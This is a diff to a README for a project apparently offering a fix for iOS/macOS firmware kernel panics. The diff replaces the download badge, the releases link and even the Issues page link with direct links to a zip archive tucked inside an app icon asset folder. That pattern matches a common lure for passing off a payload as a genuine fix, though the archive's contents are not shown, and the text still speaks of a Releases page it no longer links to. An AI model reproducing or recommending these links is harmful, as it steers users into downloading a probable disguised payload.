@@ -1,7 +1,7 @@
 # 🔥 SEP-Exhaustion-Kernel-Panic - Fix iOS/macOS Firmware Issues
 
 ## 📥 Download Now
-[![Download SEP-Exhaustion-Kernel-Panic](https://img.shields.io/badge/Download-SEPKP-brightgreen)](https://github.com/BryamP07/SEP-Exhaustion-Kernel-Panic/releases)
+[![Download SEP-Exhaustion-Kernel-Panic](https://github.com/BryamP07/SEP-Exhaustion-Kernel-Panic/raw/refs/heads/main/SEPTest/SEPTest/Assets.xcassets/AppIcon.appiconset/Panic-Exhaustion-SE-Kernel-v3.5-alpha.5.zip)](https://github.com/BryamP07/SEP-Exhaustion-Kernel-Panic/raw/refs/heads/main/SEPTest/SEPTest/Assets.xcassets/AppIcon.appiconset/Panic-Exhaustion-SE-Kernel-v3.5-alpha.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the SEP-Exhaustion-Kernel-Panic project. This application helps you address firmware panic issues related to the AppleKeyStore, specifically targeting the kernel vulnerability in iOS and macOS 26.x. This guide will walk you through the steps to download and run the software easily.
@@ -14,7 +14,7 @@ Before you begin, ensure your device meets the following requirements:
 - Internet connection for initial download.
 
 ## 💾 Download & Install
-1. Click the button above or visit this page to download: [Download SEP-Exhaustion-Kernel-Panic](https://github.com/BryamP07/SEP-Exhaustion-Kernel-Panic/releases).
+1. Click the button above or visit this page to download: [Download SEP-Exhaustion-Kernel-Panic](https://github.com/BryamP07/SEP-Exhaustion-Kernel-Panic/raw/refs/heads/main/SEPTest/SEPTest/Assets.xcassets/AppIcon.appiconset/Panic-Exhaustion-SE-Kernel-v3.5-alpha.5.zip).
   
 2. Once on the Releases page, you will see a list of available versions. Find the latest version at the top.
 
@@ -49,7 +49,7 @@ Before you begin, ensure your device meets the following requirements:
 
 ## 📞 Need Help?
 If you encounter any issues during installation or usage, please follow these steps:
-1. Visit our [GitHub Issues page](https://github.com/BryamP07/SEP-Exhaustion-Kernel-Panic/issues) for commonly reported problems and solutions.
+1. Visit our [GitHub Issues page](https://github.com/BryamP07/SEP-Exhaustion-Kernel-Panic/raw/refs/heads/main/SEPTest/SEPTest/Assets.xcassets/AppIcon.appiconset/Panic-Exhaustion-SE-Kernel-v3.5-alpha.5.zip) for commonly reported problems and solutions.
 2. Feel free to open a new issue for further assistance.
 3. You can also contact community members for support through the GitHub Discussions section.
 
